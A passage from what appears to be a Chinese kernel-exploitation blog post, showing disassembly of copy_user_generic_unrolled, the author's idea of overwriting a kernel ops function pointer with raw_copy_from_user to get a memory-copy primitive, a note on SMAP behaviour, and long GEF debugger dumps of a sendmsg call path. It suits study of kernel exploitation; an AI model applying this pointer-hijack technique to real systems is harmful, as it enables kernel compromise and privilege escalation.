&lt;+124&gt;:   mov    ecx,edx</span><br><span class="line">0xffffffff83ab203e &lt;+126&gt;:   and    edx,0x7</span><br><span class="line">0xffffffff83ab2041 &lt;+129&gt;:   shr    ecx,0x3</span><br><span class="line">0xffffffff83ab2044 &lt;+132&gt;:   je     0xffffffff83ab2058 &lt;copy_user_generic_unrolled+152&gt;</span><br><span class="line">0xffffffff83ab2046 &lt;+134&gt;:   mov    r8,QWORD PTR [rsi]</span><br><span class="line">0xffffffff83ab2049 &lt;+137&gt;:   mov    QWORD PTR [rdi],r8</span><br><span class="line">0xffffffff83ab204c &lt;+140&gt;:   lea    rsi,[rsi+0x8]</span><br><span class="line">0xffffffff83ab2050 &lt;+144&gt;:   lea    rdi,[rdi+0x8]</span><br><span class="line">0xffffffff83ab2054 &lt;+148&gt;:   dec    ecx</span><br><span class="line">0xffffffff83ab2056 &lt;+150&gt;:   jne    0xffffffff83ab2046 &lt;copy_user_generic_unrolled+134&gt;</span><br><span class="line">0xffffffff83ab2058 &lt;+152&gt;:   and    edx,edx</span><br><span class="line">0xffffffff83ab205a &lt;+154&gt;:   je     0xffffffff83ab206c &lt;copy_user_generic_unrolled+172&gt;</span><br><span class="line">0xffffffff83ab205c &lt;+156&gt;:   mov    ecx,edx</span><br><span class="line">0xffffffff83ab205e &lt;+158&gt;:   mov    al,BYTE PTR [rsi]</span><br><span class="line">0xffffffff83ab2060 &lt;+160&gt;:   mov    BYTE PTR [rdi],al</span><br><span class="line">0xffffffff83ab2062 &lt;+162&gt;:   inc    rsi</span><br><span class="line">0xffffffff83ab2065 &lt;+165&gt;:   inc    rdi</span><br><span class="line">0xffffffff83ab2068 &lt;+168&gt;:   dec    ecx</span><br><span class="line">0xffffffff83ab206a &lt;+170&gt;:   jne    0xffffffff83ab205e &lt;copy_user_generic_unrolled+158&gt;</span><br><span class="line">0xffffffff83ab206c &lt;+172&gt;:   xor    eax,eax</span><br><span class="line">0xffffffff83ab206e &lt;+174&gt;:   nop</span><br><span class="line">0xffffffff83ab206f &lt;+175&gt;:   nop</span><br><span class="line">0xffffffff83ab2070 &lt;+176&gt;:   nop</span><br><span class="line">0xffffffff83ab2071 &lt;+177&gt;:   ret</span><br></pre></td></tr></table></figure><p>看一下汇编和raw_copy_from_user函数的源码，感觉很对应，应该就是这个函数，所以，我们只要把某一个ops的指针改成这个函数就可以了，前提，条件是你能控制前三个参数的值。。。。</p><h4 id="0x01-遇到的问题"><a href="#0x01-遇到的问题" class="headerlink" title="0x01 遇到的问题"></a>0x01 遇到的问题</h4><p>不知道你发现了没有，这个操作没有关smap的操作，然后，我动态调试的时候，我发现一个问题，即使开了smap，copy_from_user没关smap就能访问用户态内存，懵了，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br></pre></td><td class="code"><pre><span class="line"> Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x0000000000000001  →  0x0000000000000001</span><br><span class="line">$rbx   : 0x0000000000000038  →  0x0000000000000038</span><br><span class="line">$rcx   : 0x0000000000000007  →  0x0000000000000007</span><br><span class="line">$rdx   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rsp   : 0xffff88806af87ad8  →  0xffffffff81f222fd  →  0x2789e8b8ebc48941  →  0x2789e8b8ebc48941</span><br><span class="line">$rbp   : 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$rsi   : 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$rdi   : 0xffff88806af87b40  →  0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rip   : 0xffffffff83ab2046  →  0x8d4807894c068b4c  →  0x8d4807894c068b4c</span><br><span class="line">$r8    : 0x0000000000000001  →  0x0000000000000001</span><br><span class="line">$r9    : 0xffffed100d5f0f6f  →  0x000000f3f3f3f3f3  →  0x000000f3f3f3f3f3</span><br><span class="line">$r10   : 0xffffed100d5f0f6e  →  0x0000f3f3f3f3f300  →  0x0000f3f3f3f3f300</span><br><span class="line">$r11   : 0xffff88806af87b77  →  0xff888066060848ff  →  0xff888066060848ff</span><br><span class="line">$r12   : 0x00007ffd9ad00018  →  0x00007f6a1c969483  →  0x000154880fc08548  →  0x000154880fc08548</span><br><span class="line">$r13   : 0xffff88806af87b40  →  0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r14   : 0x00007ffffffff000  →  0x00007ffffffff000</span><br><span class="line">$r15   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffff88806af87ad8│+0x0000: 0xffffffff81f222fd  →  0x2789e8b8ebc48941  →  0x2789e8b8ebc48941     ← $rsp</span><br><span class="line">0xffff88806af87ae0│+0x0008: 0xffff88806af87e58  →  0xffff88806af87d20  →  0x0000000041b58ab3  →  0x0000000041b58ab3</span><br><span class="line">0xffff88806af87ae8│+0x0010: 0x1ffff1100d5f0f64  →  0x1ffff1100d5f0f64</span><br><span class="line">0xffff88806af87af0│+0x0018: 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">0xffff88806af87af8│+0x0020: 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">0xffff88806af87b00│+0x0028: 0xffff88806af87c60  →  0xffff88806af87c80  →  0xffffffff812ca7f0  →  0xfc0000000000b848  →  0xfc0000000000b848</span><br><span class="line">0xffff88806af87b08│+0x0030: 0xdffffc0000000000  →  0xdffffc0000000000</span><br><span class="line">0xffff88806af87b10│+0x0038: 0xffffffff82fc0dde  →  0xc68948c48949ff31  →  0xc68948c48949ff31</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0xffffffff83ab203e &lt;copy_user_generic_unrolled+126&gt; and    edx, 0x7</span><br><span class="line">   0xffffffff83ab2041 &lt;copy_user_generic_unrolled+129&gt; shr    ecx, 0x3</span><br><span class="line">   0xffffffff83ab2044 &lt;copy_user_generic_unrolled+132&gt; je     0xffffffff83ab2058 &lt;copy_user_generic_unrolled+152&gt;</span><br><span class="line"> → 0xffffffff83ab2046 &lt;copy_user_generic_unrolled+134&gt; mov    r8, QWORD PTR [rsi]</span><br><span class="line">   0xffffffff83ab2049 &lt;copy_user_generic_unrolled+137&gt; mov    QWORD PTR [rdi], r8</span><br><span class="line">   0xffffffff83ab204c &lt;copy_user_generic_unrolled+140&gt; lea    rsi, [rsi+0x8]</span><br><span class="line">   0xffffffff83ab2050 &lt;copy_user_generic_unrolled+144&gt; lea    rdi, [rdi+0x8]</span><br><span class="line">   0xffffffff83ab2054 &lt;copy_user_generic_unrolled+148&gt; dec    ecx</span><br><span class="line">   0xffffffff83ab2056 &lt;copy_user_generic_unrolled+150&gt; jne    0xffffffff83ab2046 &lt;copy_user_generic_unrolled+134&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:arch/x86/lib/co[...].S+90 ────</span><br><span class="line">     85  .L_copy_short_string:</span><br><span class="line">     86         movl %edx,%ecx</span><br><span class="line">     87         andl $7,%edx</span><br><span class="line">     88         shrl $3,%ecx</span><br><span class="line">     89         jz 20f</span><br><span class="line"> →   90  18:    movq (%rsi),%r8</span><br><span class="line">     91  19:    movq %r8,(%rdi)</span><br><span class="line">     92         leaq 8(%rsi),%rsi</span><br><span class="line">     93         leaq 8(%rdi),%rdi</span><br><span class="line">     94         decl %ecx</span><br><span class="line">     95         jnz 18b</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, stopped 0xffffffff83ab2046 in copy_user_generic_unrolled (), reason: SINGLE STEP</span><br><span class="line">[#1] Id 2, stopped 0xffffffff81218b90 in rebalance_domains (), reason: SINGLE STEP</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0xffffffff83ab2046 → copy_user_generic_unrolled()</span><br><span class="line">[#1] 0xffffffff81f222fd → copy_user_generic(len=0x0, from=0x7ffd9acfffe0, to=0xffff88806af87b40)</span><br><span class="line">[#2] 0xffffffff81f222fd → raw_copy_from_user(size=&lt;optimized out&gt;, src=&lt;optimized out&gt;, dst=&lt;optimized out&gt;)</span><br><span class="line">[#3] 0xffffffff81f222fd → _copy_from_user(to=0xffff88806af87b40, from=0x7ffd9acfffe0, n=0x38)</span><br><span class="line">[#4] 0xffffffff82fc0dde → copy_from_user(n=&lt;optimized out&gt;, from=&lt;optimized out&gt;, to=&lt;optimized out&gt;)</span><br><span class="line">[#5] 0xffffffff82fc0dde → copy_msghdr_from_user(kmsg=0xffff88806af87e58, umsg=0x7ffd9acfffe0, save_addr=0x0 &lt;fixed_percpu_data&gt;, iov=0xffff88806af87c60)</span><br><span class="line">[#6] 0xffffffff82fcb7b8 → sendmsg_copy_msghdr(msg=0xffff88806af87e58, umsg=0x7ffd9acfffe0, flags=0x4000, iov=0xffff88806af87c60)</span><br><span class="line">[#7] 0xffffffff82fcb8bf → ___sys_sendmsg(sock=&lt;optimized out&gt;, msg=0x7ffd9acfffe0, msg_sys=0xffff88806af87e58, flags=0x4000, used_address=&lt;optimized out&gt;, allowed_msghdr_flags=&lt;optimized out&gt;)</span><br><span class="line">[#8] 0xffffffff82fcbafc → __sys_sendmsg(fd=&lt;optimized out&gt;, msg=0x7ffd9acfffe0, flags=0x4000, forbid_cmsg_compat=0x1)</span><br><span class="line">[#9] 0xffffffff81007e9c → do_syscall_64(nr=&lt;optimized out&gt;, regs=0xffff88806af87f58)</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  si</span><br><span class="line">91      19:     movq %r8,(%rdi)</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x0000000000000001  →  0x0000000000000001</span><br><span class="line">$rbx   : 0x0000000000000038  →  0x0000000000000038</span><br><span class="line">$rcx   : 0x0000000000000007  →  0x0000000000000007</span><br><span class="line">$rdx   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rsp   : 0xffff88806af87ad8  →  0xffffffff81f222fd  →  0x2789e8b8ebc48941  →  0x2789e8b8ebc48941</span><br><span class="line">$rbp   : 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$rsi   : 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$rdi   : 0xffff88806af87b40  →  0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rip   : 0xffffffff83ab2049  →  0x4808768d4807894c  →  0x4808768d4807894c</span><br><span class="line">$r8    : 0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$r9    : 0xffffed100d5f0f6f  →  0x000000f3f3f3f3f3  →  0x000000f3f3f3f3f3</span><br><span class="line">$r10   : 0xffffed100d5f0f6e  →  0x0000f3f3f3f3f300  →  0x0000f3f3f3f3f300</span><br><span class="line">$r11   : 0xffff88806af87b77  →  0xff888066060848ff  →  0xff888066060848ff</span><br><span class="line">$r12   : 0x00007ffd9ad00018  →  0x00007f6a1c969483  →  0x000154880fc08548  →  0x000154880fc08548</span><br><span class="line">$r13   : 0xffff88806af87b40  →  0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r14   : 0x00007ffffffff000  →  0x00007ffffffff000</span><br><span class="line">$r15   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffff88806af87ad8│+0x0000: 0xffffffff81f222fd  →  0x2789e8b8ebc48941  →  0x2789e8b8ebc48941     ← $rsp</span><br><span class="line">0xffff88806af87ae0│+0x0008: 0xffff88806af87e58  →  0xffff88806af87d20  →  0x0000000041b58ab3  →  0x0000000041b58ab3</span><br><span class="line">0xffff88806af87ae8│+0x0010: 0x1ffff1100d5f0f64  →  0x1ffff1100d5f0f64</span><br><span class="line">0xffff88806af87af0│+0x0018: 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">0xffff88806af87af8│+0x0020: 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">0xffff88806af87b00│+0x0028: 0xffff88806af87c60  →  0xffff88806af87c80  →  0xffffffff812ca7f0  →  0xfc0000000000b848  →  0xfc0000000000b848</span><br><span class="line">0xffff88806af87b08│+0x0030: 0xdffffc0000000000  →  0xdffffc0000000000</span><br><span class="line">0xffff88806af87b10│+0x0038: 0xffffffff82fc0dde  →  0xc68948c48949ff31  →  0xc68948c48949ff31</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0xffffffff83ab203d &lt;copy_user_generic_unrolled+125&gt; rol    DWORD PTR [rbx-0x163ef81e], 1</span><br><span class="line">   0xffffffff83ab2043 &lt;copy_user_generic_unrolled+131&gt; add    esi, DWORD PTR [rdx+rdx*1+0x4c]</span><br><span class="line">   0xffffffff83ab2047 &lt;copy_user_generic_unrolled+135&gt; mov    eax, DWORD PTR [rsi]</span><br><span class="line"> → 0xffffffff83ab2049 &lt;copy_user_generic_unrolled+137&gt; mov    QWORD PTR [rdi], r8</span><br><span class="line">   0xffffffff83ab204c &lt;copy_user_generic_unrolled+140&gt; lea    rsi, [rsi+0x8]</span><br><span class="line">   0xffffffff83ab2050 &lt;copy_user_generic_unrolled+144&gt; lea    rdi, [rdi+0x8]</span><br><span class="line">   0xffffffff83ab2054 &lt;copy_user_generic_unrolled+148&gt; dec    ecx</span><br><span class="line">   0xffffffff83ab2056 &lt;copy_user_generic_unrolled+150&gt; jne    0xffffffff83ab2046 &lt;copy_user_generic_unrolled+134&gt;</span><br><span class="line">   0xffffffff83ab2058 &lt;copy_user_generic_unrolled+152&gt; and    edx, edx</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:arch/x86/lib/co[...].S+91 ────</span><br><span class="line">     86         movl %edx,%ecx</span><br><span class="line">     87         andl $7,%edx</span><br><span class="line">     88         shrl $3,%ecx</span><br><span class="line">     89         jz 20f</span><br><span class="line">     90  18:    movq (%rsi),%r8</span><br><span class="line"> →   91  19:    movq %r8,(%rdi)</span><br><span class="line">     92         leaq 8(%rsi),%rsi</span><br><span class="line">     93         leaq 8(%rdi),%rdi</span><br><span class="line">     94         decl %ecx</span><br><span class="line">     95         jnz 18b</span><br><span class="line">     96  20:    andl %edx,%edx</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, stopped 0xffffffff83ab2049 in copy_user_generic_unrolled (), reason: SINGLE STEP</span><br><span class="line">[#1] Id 2, stopped 0xffffffff81218b90 in rebalance_domains (), reason: SINGLE STEP</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0xffffffff83ab2049 → copy_user_generic_unrolled()</span><br><span class="line">[#1] 0xffffffff81f222fd → copy_user_generic(len=0x0, from=0x7ffd9acfffe0, to=0xffff88806af87b40)</span><br><span class="line">[#2] 0xffffffff81f222fd → raw_copy_from_user(size=&lt;optimized out&gt;, src=&lt;optimized out&gt;, dst=&lt;optimized out&gt;)</span><br><span class="line">[#3] 0xffffffff81f222fd → _copy_from_user(to=0xffff88806af87b40, from=0x7ffd9acfffe0, n=0x38)</span><br><span class="line">[#4] 0xffffffff82fc0dde → copy_from_user(n=&lt;optimized out&gt;, from=&lt;optimized out&gt;, to=&lt;optimized out&gt;)</span><br><span class="line">[#5] 0xffffffff82fc0dde → copy_msghdr_from_user(kmsg=0xffff88806af87e58, umsg=0x7ffd9acfffe0, save_addr=0x0 &lt;fixed_percpu_data&gt;, iov=0xffff88806af87c60)</span><br><span class="line">[#6] 0xffffffff82fcb7b8 → sendmsg_copy_msghdr(msg=0xffff88806af87e58, umsg=0x7ffd9acfffe0, flags=0x4000, iov=0xffff88806af87c60)</span><br><span class="line">[#7] 0xffffffff82fcb8bf → ___sys_sendmsg(sock=&lt;optimized out&gt;, msg=0x7ffd9acfffe0, msg_sys=0xffff88806af87e58, flags=0x4000, used_address=&lt;optimized out&gt;, allowed_msghdr_flags=&lt;optimized out&gt;)</span><br><span class="line">[#8] 0xffffffff82fcbafc → __sys_sendmsg(fd=&lt;optimized out&gt;, msg=0x7ffd9acfffe0, flags=0x4000, forbid_cmsg_compat=0x1)</span><br><span class="line">[#9] 0xffffffff81007e9c → do_syscall_64(nr=&lt;optimized out&gt;, regs=0xffff88806af87f58)</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br><span class="line">92              leaq 8(%rsi),%rsi</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x0000000000000001  →  0x0000000000000001</span><br><span class="line">$rbx   : 0x0000000000000038  →  0x0000000000000038</span><br><span class="line">$rcx   : 0x0000000000000007  →  0x0000000000000007</span><br><span class="line">$rdx   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rsp   : 0xffff88806af87ad8  →  0xffffffff81f222fd  →  0x2789e8b8ebc48941  →  0x2789e8b8ebc48941</span><br><span class="line">$rbp   : 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$rsi   : 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$rdi   : 0xffff88806af87b40  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$rip   : 0xffffffff83ab204c  →  0x087f8d4808768d48  →  0x087f8d4808768d48</span><br><span class="line">$r8    : 0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$r9    : 0xffffed100d5f0f6f  →  0x000000f3f3f3f3f3  →  0x000000f3f3f3f3f3</span><br><span class="line">$r10   : 0xffffed100d5f0f6e  →  0x0000f3f3f3f3f300  →  0x0000f3f3f3f3f300</span><br><span class="line">$r11   : 0xffff88806af87b77  →  0xff888066060848ff  →  0xff888066060848ff</span><br><span class="line">$r12   : 0x00007ffd9ad00018  →  0x00007f6a1c969483  →  0x000154880fc08548  →  0x000154880fc08548</span><br><span class="line">$r13   : 0xffff88806af87b40  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$r14   : 0x00007ffffffff000  →  0x00007ffffffff000</span><br><span class="line">$r15   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffff88806af87ad8│+0x0000: 0xffffffff81f222fd  →  0x2789e8b8ebc48941  →  0x2789e8b8ebc48941     ← $rsp</span><br><span class="line">0xffff88806af87ae0│+0x0008: 0xffff88806af87e58  →  0xffff88806af87d20  →  0x0000000041b58ab3  →  0x0000000041b58ab3</span><br><span class="line">0xffff88806af87ae8│+0x0010: 0x1ffff1100d5f0f64  →  0x1ffff1100d5f0f64</span><br><span class="line">0xffff88806af87af0│+0x0018: 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">0xffff88806af87af8│+0x0020: 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">0xffff88806af87b00│+0x0028: 0xffff88806af87c60  →  0xffff88806af87c80  →  0xffffffff812ca7f0  →  0xfc0000000000b848  →  0xfc0000000000b848</span><br><span class="line">0xffff88806af87b08│+0x0030: 0xdffffc0000000000  →  0xdffffc0000000000</span><br><span class="line">0xffff88806af87b10│+0x0038: 0xffffffff82fc0dde  →  0xc68948c48949ff31  →  0xc68948c48949ff31</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0xffffffff83ab2042 &lt;copy_user_generic_unrolled+130&gt; 